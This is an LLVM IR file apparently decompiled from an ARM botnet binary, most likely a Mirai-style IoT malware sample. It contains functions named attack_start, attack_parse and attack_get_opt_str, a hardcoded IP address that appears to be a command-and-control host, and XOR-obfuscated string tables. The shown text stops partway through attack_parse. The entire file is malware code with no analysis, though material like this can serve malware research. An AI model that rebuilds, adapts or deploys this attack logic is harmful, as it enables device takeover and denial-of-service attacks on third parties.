source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_219ec.22 = global i32 0
@global_var_d934.26 = constant i32 -382906384
@global_var_21c10.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_12d8c.33 = constant i32 -382909968
@global_var_bd94.39 = constant i32 -382906384
@global_var_c1cc.41 = constant i32 -382906384
@global_var_b608.43 = constant i32 -382906384
@global_var_af5c.45 = constant i32 -382906384
@global_var_a864.47 = constant i32 -382906384
@global_var_a0b0.49 = constant i32 -382906384
@global_var_9040.52 = constant i32 -382906384
@global_var_89ac.54 = constant i32 -382906384
@global_var_965c.56 = constant i32 -382906384
@global_var_2472c.58 = global i32 0
@global_var_24734.70 = global i32 0
@global_var_19278.72 = constant i32 47
@global_var_c707.74 = constant [3 x i8] c"\0AH\00"
@global_var_21c14.76 = global i32 0
@global_var_24730.78 = global i32 0
@global_var_10c64.80 = constant i32 -382910336
@global_var_d7fc.82 = constant i32 -382910448
@global_var_21aa0.84 = global i32 67100
@global_var_21a98.86 = global i32 -1
@global_var_1927c.91 = constant [15 x i8] c"212.237.54.173\00"
@global_var_2473c.94 = local_unnamed_addr global i32 0
@global_var_2473a.95 = local_unnamed_addr global i32 0
@global_var_21c18.97 = global i32 0
@global_var_1928c.105 = constant i32 10
@global_var_21a9c.107 = global i32 -1
@global_var_14260.112 = constant i32 -450904024
@global_var_1061c.113 = constant i32 -382910352
@global_var_e0f4.115 = constant i32 138264
@global_var_19290.117 = constant i32 16777216
@global_var_21c20.119 = global i32 0
@global_var_21c2c.121 = global i32 0
@global_var_21c24.123 = global i32 0
@global_var_21c28.125 = global i32 0
@global_var_21c64.139 = global i32 0
@global_var_21c30.141 = global i32 0
@global_var_21c5c.143 = global i32 0
@global_var_24750.147 = global i32 0
@global_var_24748.151 = global i32 0
@global_var_2474c.153 = global i32 0
@global_var_21c36.156 = local_unnamed_addr global i32 0
@global_var_21c38.160 = local_unnamed_addr global i32 0
@global_var_21c3c.161 = local_unnamed_addr global i32 0
@global_var_21c3d.162 = local_unnamed_addr global i32 0
@global_var_21c56.165 = local_unnamed_addr global i32 0
@global_var_1929c.167 = constant i32 0
@global_var_19298.169 = constant [5 x i8] c"&;; \00"
@global_var_192a0.171 = constant [5 x i8] c"5:?;\00"
@global_var_192a8.173 = constant [9 x i8] c"<!: acam\00"
@global_var_192b4.175 = constant [7 x i8] c" 18:1 \00"
@global_var_192bc.177 = constant [8 x i8] c"0125!8 \00"
@global_var_192c4.179 = constant [9 x i8] c"$5''#;&0\00"
@global_var_192d0.181 = constant [6 x i8] c"509=:\00"
@global_var_192d8.183 = constant [6 x i8] c"\22=.,\22\00"
@global_var_192e0.185 = constant [8 x i8] c"'!$$;& \00"
@global_var_192e8.187 = constant i32 423502179
@global_var_192f8.189 = constant [6 x i8] c"efg`a\00"
@global_var_19300.191 = constant [5 x i8] c"!'1&\00"
@global_var_19308.193 = constant i32 943467547
@global_var_19314.195 = constant i32 322070023
@global_var_21c40.196 = local_unnamed_addr global i32 0
@global_var_21c3e.197 = local_unnamed_addr global i32 0
@global_var_21c44.198 = local_unnamed_addr global i32 0
@global_var_21c4c.200 = local_unnamed_addr global i32 0
@global_var_21c58.201 = local_unnamed_addr global i32 0
@global_var_e36c.203 = constant i32 -382910352
@global_var_19320.205 = constant [3 x i8] c"\0D\0A\00"
@global_var_1932c.207 = constant i32 2096127
@global_var_19323.209 = constant i32 2095871
@global_var_24758.215 = global i32 0
@global_var_21aa8.218 = global i32 -555811921
@global_var_19330.223 = constant [3 x i8] c"Qm\00"
@global_var_24760.224 = local_unnamed_addr global i32 0
@global_var_24764.225 = local_unnamed_addr global i32 0
@global_var_19334.227 = constant [16 x i8] c"fefzfgcza`zecgT\00"
@global_var_24768.228 = local_unnamed_addr global i32 0
@global_var_2476c.229 = local_unnamed_addr global i32 0
@global_var_24770.230 = local_unnamed_addr global i32 0
@global_var_24774.231 = local_unnamed_addr global i32 0
@global_var_19344.233 = constant i32 59987
@global_var_24778.234 = local_unnamed_addr global i32 0
@global_var_2477c.235 = local_unnamed_addr global i32 0
@global_var_194c4.237 = constant i32 808465680
@global_var_24784.238 = local_unnamed_addr global i32 0
@global_var_24780.239 = local_unnamed_addr global i32 0
@global_var_19348.241 = constant [7 x i8] c"'<188T\00"
@global_var_24788.242 = local_unnamed_addr global i32 0
@global_var_2478c.243 = local_unnamed_addr global i32 0
@global_var_19350.245 = constant [8 x i8] c"1:5681T\00"
@global_var_24790.246 = local_unnamed_addr global i32 0
@global_var_24794.247 = local_unnamed_addr global i32 0
@global_var_19358.249 = constant [8 x i8] c"'-' 19T\00"
@global_var_24798.250 = local_unnamed_addr global i32 0
@global_var_2479c.251 = local_unnamed_addr global i32 0
@global_var_19360.253 = constant [4 x i8] c"'<T\00"
@global_var_247a4.254 = local_unnamed_addr global i32 0
@global_var_247a0.255 = local_unnamed_addr global i32 0
@global_var_19364.257 = constant i32 977090171
@global_var_247ac.258 = local_unnamed_addr global i32 0
@global_var_247a8.259 = local_unnamed_addr global i32 0
@global_var_19378.261 = constant i32 470227742
@global_var_247b4.262 = local_unnamed_addr global i32 0
@global_var_247b0.263 = local_unnamed_addr global i32 0
@global_var_19394.265 = constant [10 x i8] c":7;&&17 T\00"
@global_var_247bc.266 = local_unnamed_addr global i32 0
@global_var_247b8.267 = local_unnamed_addr global i32 0
@global_var_193a0.269 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_247c0.270 = local_unnamed_addr global i32 0
@global_var_247c4.271 = local_unnamed_addr global i32 0
@global_var_10310.272 = constant i32 103348
@global_var_193b4.273 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_247cc.274 = local_unnamed_addr global i32 0
@global_var_247c8.275 = local_unnamed_addr global i32 0
@global_var_193cc.277 = constant [8 x i8] c"{$&;7{T\00"
@global_var_247d0.278 = local_unnamed_addr global i32 0
@global_var_247d4.279 = local_unnamed_addr global i32 0
@global_var_193d4.281 = constant [6 x i8] c"{1,1T\00"
@global_var_247d8.282 = local_unnamed_addr global i32 0
@global_var_247dc.283 = local_unnamed_addr global i32 0
@global_var_193dc.285 = constant [5 x i8] c"{20T\00"
@global_var_247e4.286 = local_unnamed_addr global i32 0
@global_var_247e0.287 = local_unnamed_addr global i32 0
@global_var_193e4.289 = constant [7 x i8] c"{95$'T\00"
@global_var_247e8.290 = local_unnamed_addr global i32 0
@global_var_247ec.291 = local_unnamed_addr global i32 0
@global_var_193ec.293 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_247f0.294 = local_unnamed_addr global i32 0
@global_var_247f4.295 = local_unnamed_addr global i32 0
@global_var_193fc.297 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_24858.298 = local_unnamed_addr global i32 0
@global_var_19408.300 = constant [8 x i8] c"z5:=91T\00"
@global_var_24860.301 = local_unnamed_addr global i32 0
@global_var_19410.303 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_247f8.304 = local_unnamed_addr global i32 0
@global_var_247fc.305 = local_unnamed_addr global i32 0
@global_var_19424.307 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_24800.308 = local_unnamed_addr global i32 0
@global_var_24804.309 = local_unnamed_addr global i32 0
@global_var_1943c.311 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24808.312 = local_unnamed_addr global i32 0
@global_var_2480c.313 = local_unnamed_addr global i32 0
@global_var_194e4.315 = constant i32 557516544
@global_var_24814.316 = local_unnamed_addr global i32 0
@global_var_24810.317 = local_unnamed_addr global i32 0
@global_var_19448.319 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_2481c.320 = local_unnamed_addr global i32 0
@global_var_24818.321 = local_unnamed_addr global i32 0
@global_var_1945c.323 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_24824.324 = local_unnamed_addr global i32 0
@global_var_24820.325 = local_unnamed_addr global i32 0
@global_var_1946c.327 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_24828.328 = local_unnamed_addr global i32 0
@global_var_2482c.329 = local_unnamed_addr global i32 0
@global_var_1947c.331 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_24834.332 = local_unnamed_addr global i32 0
@global_var_24830.333 = local_unnamed_addr global i32 0
@global_var_19490.335 = constant [9 x i8] c"$662*7!E\00"
@global_var_24838.336 = local_unnamed_addr global i32 0
@global_var_2483c.337 = local_unnamed_addr global i32 0
@global_var_10354.338 = constant i32 103580
@global_var_1949c.339 = constant [6 x i8] c";3=:T\00"
@global_var_24840.340 = local_unnamed_addr global i32 0
@global_var_24844.341 = local_unnamed_addr global i32 0
@global_var_194a4.343 = constant [7 x i8] c"1: 1&T\00"
@global_var_24848.344 = local_unnamed_addr global i32 0
@global_var_2484c.345 = local_unnamed_addr global i32 0
@global_var_194ac.347 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_24854.348 = local_unnamed_addr global i32 0
@global_var_24850.349 = local_unnamed_addr global i32 0
@global_var_11018.351 = constant i32 68268
@global_var_219f0.357 = global i32 0
@global_var_10fbc.378 = constant i32 -443088884
@global_var_f000.385 = constant i32 -481099768
@global_var_1145c.395 = constant i32 -456978431
@global_var_10498.402 = constant i32 -481099767
@global_var_11d4c.440 = constant i32 -478871519
@global_var_127f0.457 = constant i32 -478805983
@global_var_12bd8.467 = constant i32 -382906384
@global_var_14ce0.476 = constant i32 -442544040
@global_var_13570.499 = constant i32 -369098502
@global_var_13f44.513 = constant i32 -382910288
@global_var_140f4.525 = constant i32 -2020859901
@global_var_141e0.528 = constant i32 -494075872
@global_var_10e28.529 = constant i32 -382910336
@global_var_24bf0.532 = local_unnamed_addr global i32 0
@global_var_13008.545 = constant i32 -442543860
@global_var_113c0.553 = constant i32 -369093146
@global_var_cd7c.577 = constant i32 436207673
@global_var_151d8.581 = constant i32 -382910352
@global_var_cb08.587 = constant i32 324206624
@global_var_165e8.603 = constant i32 -382906384
@global_var_160a8.631 = constant i32 -382910448
@global_var_17a98.632 = constant i32 -382909968
@global_var_181d4.694 = constant i32 -481296376
@global_var_182cc.695 = constant i32 -481296376
@global_var_18350.696 = constant i32 -369098732
@global_var_21bf0.12 = external global i8*
@global_var_21c0c.29 = external global i8*
@global_var_21c0d.37 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_21aa4.88 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24738.93 = global i16* null
@global_var_21c1c.110 = external global i8*
@global_var_21c60.145 = global i16* null
@global_var_21c34.155 = external global i8*
@global_var_21c48.158 = global i16 0
@global_var_21c54.159 = local_unnamed_addr global i8 0
@global_var_21c4a.163 = local_unnamed_addr global i16 0
@global_var_21c55.164 = local_unnamed_addr global i8 0
@global_var_21a48.352 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_21bf0.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_21bf0.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_21bf0.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_219ec.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_219ec.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_219ec.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d934.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 103016, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_21c0c.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_21c0c.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_21c10.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_21c10.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
